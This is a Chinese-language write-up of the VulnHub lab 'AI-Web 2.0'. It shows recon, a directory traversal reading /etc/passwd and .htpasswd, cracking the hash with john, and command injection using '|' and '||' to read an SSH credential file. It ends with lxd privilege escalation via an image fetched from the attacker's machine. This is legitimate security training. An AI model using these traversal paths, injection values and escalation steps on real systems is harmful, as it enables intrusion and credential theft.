# vulnhub靶场ai-web 2.0

配置环境 windows11 vmware 17.5 kali

靶机地址https://www.vulnhub.com/entry/ai-web-2,357/

![image-20231120211538433](http://111.229.225.13:81/i/2023/11/20/yzhpj5-2.png)

攻击机kali192.168.31.131

首先使用

```bash
arp-scan -l 
```

探测目标ip地址

![image-20231120211706884](http://111.229.225.13:81/i/2023/11/20/z0g7kq-2.png)

发现目标ip地址为

192.168.31.134

使用nmap工具进行信息收集

```bash
nmap -T4 -sV -O -A -P //-T4(速度) -sV(版本扫描和开启的服务) -O(操作系统) -p（所有端口） ip
```

![image-20231120211912626](http://111.229.225.13:81/i/2023/11/20/z1pbfs-2.png)

可以发现开放22和80端口，推测为ssh和http服务

先浏览器瞅一眼

![image-20231120212106360](http://111.229.225.13:81/i/2023/11/20/z2u9wh-2.png)

先尝试admin等其他常见用户名登录无果

然后点击signup发现这是一个注册接口

![image-20231120212213645](http://111.229.225.13:81/i/2023/11/20/z3gyux-2.png)

注册好username就可以直接进行登录，这里注册一个admin

![image-20231120212309584](http://111.229.225.13:81/i/2023/11/20/z41n65-2.png)

根据页面提示内容进行搜索

![image-20231120212953211](http://111.229.225.13:81/i/2023/11/20/z7w2ha-2.png)

![image-20231120213020420](http://111.229.225.13:81/i/2023/11/20/z89v37-2.png)

发现此为目录遍历漏洞

采用/download.php?file_name=.../etc/passwd的形式读取

![image-20231120213334820](http://111.229.225.13:81/i/2023/11/20/za55yj-2.png)

一点一点的尝试

../../../../../etc/passwd 

![image-20231120213411362](http://111.229.225.13:81/i/2023/11/20/zalsjs-2.png)

根据之前信息收集的结果来看，服务器采用apache

所以尝试读取/etc/apache2/.htpasswd文件

![image-20231120213957362](http://111.229.225.13:81/i/2023/11/20/zdup4c-2.png)

得到对应的hash密码

尝试使用工具破解

这里采用john工具进行破解，kali自带

github上的rockyou-45作为字典进行爆破https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-45.txt ，同时把hash密码存放在temp.txt中（自己建）

```bash
john --wordlist=rockyou-45.txt temp.txt 
```

![image-20231120214659301](http://111.229.225.13:81/i/2023/11/20/zi9olk-2.png)

再使用

```bash
john --show temp.txt 
```

命令查看密码

![image-20231120214754161](http://111.229.225.13:81/i/2023/11/20/ziln28-2.png)

发现密码为c.ronaldo

尝试之前发现的ssh端口，发现不是ssh账号密码

之前采用过

```bash
dirb http://192.168.31.134/
```

目录爆破

![image-20231120215000851](http://111.229.225.13:81/i/2023/11/20/zk27xp-2.png)

发现了一个页面

![image-20231120215121112](http://111.229.225.13:81/i/2023/11/20/zks6qf-2.png)

尝试用刚刚收集到的账号密码

账号aiweb2admin   密码c.ronaldo

发现可以登录

![image-20231120215232831](http://111.229.225.13:81/i/2023/11/20/zlgbf1-2.png)

根据提示内容，得知还有robots页面

![image-20231120215307497](http://111.229.225.13:81/i/2023/11/20/zlw2k5-2.png)

发现新的目录

![image-20231120215356221](http://111.229.225.13:81/i/2023/11/20/zm6amy-2.png)

ok命令执行

![image-20231120215419837](http://111.229.225.13:81/i/2023/11/20/zmkggw-2.png)

经测试 可以使用|执行其他命令 这里输入为 | whomai

这里也尝试过bash反弹shell但是没有用，可能是做了限制

![image-20231120215508900](http://111.229.225.13:81/i/2023/11/20/zn34jv-2.png)

采用find命令

```bash
|| find . -type f /var/www/html/webadmin/S0mextras
```

找寻网站下所有文件

![image-20231121153409443](http://111.229.225.13:81/i/2023/11/21/pdenfv-2.png)

发现了sshUserCred55512.txt文件

cat看一下

```bash
|| cat /var/www/html/webadmin/S0mextras/.sshUserCred55512.txt
```

![image-20231121153507358](http://111.229.225.13:81/i/2023/11/21/pdy1an-2.png)

ssh连接（windows10dos也可以连接，这里我采用xshelll）

![image-20231121153620062](http://111.229.225.13:81/i/2023/11/21/pemx25-2.png)

whoami，id查看权限

![image-20231121153702787](http://111.229.225.13:81/i/2023/11/21/pf41vt-2.png)

发现用户也属于lxd组

想到了lxd提权

使用

```bash
find / -perm -u=s -type f 2>/dev/null
```

从根目录查找具有root权限的二进制文件

![image-20231121154524864](http://111.229.225.13:81/i/2023/11/21/pk068g-2.png)

刚好发现了lxc也存在root权限

![image-20231121154627794](http://111.229.225.13:81/i/2023/11/21/pkm7uk-2.png)

所以采用lxd提权

在kali机上制作镜像，使用kali的root权限

lxd提权借鉴于[lxd/lxc组提权 - hirak0 - 博客园 (cnblogs.com)](https://www.cnblogs.com/hirak0/p/16111530.html#:~:text=如果你属于 lxd 或 lxc 组，你可以利用这个进行提权,在没有互联网的情况下利用 方法一 您可以在您的机器上安装此发行版构建器： https%3A%2F%2Fgithub.com%2Flxc%2Fdistrobuilder（按照 github 的说明进行操作）)

![image-20231121155010081](http://111.229.225.13:81/i/2023/11/21/pmw634-2.png)

我这边已经制作好镜像了

所以使用python -m http.server 自定义端口号

搭建vps

再使用靶机下载下来

```bash
wget -S http://192.168.31.131:8848/对应镜像
```

![image-20231121185003711](http://111.229.225.13:81/i/2023/11/21/ulgxio-2.png)



此时已经是root权限了

使用find命令查找flag

```bash
find / -name flag*
```



![image-20231121185731069](http://111.229.225.13:81/i/2023/11/21/upsqks-2.png)

最后在来一首cat查看

### 总结：

​	1、目录扫描

​	2、目录遍历

​	3、命令执行

​	4、**find命令**

​	5、**lxd提权**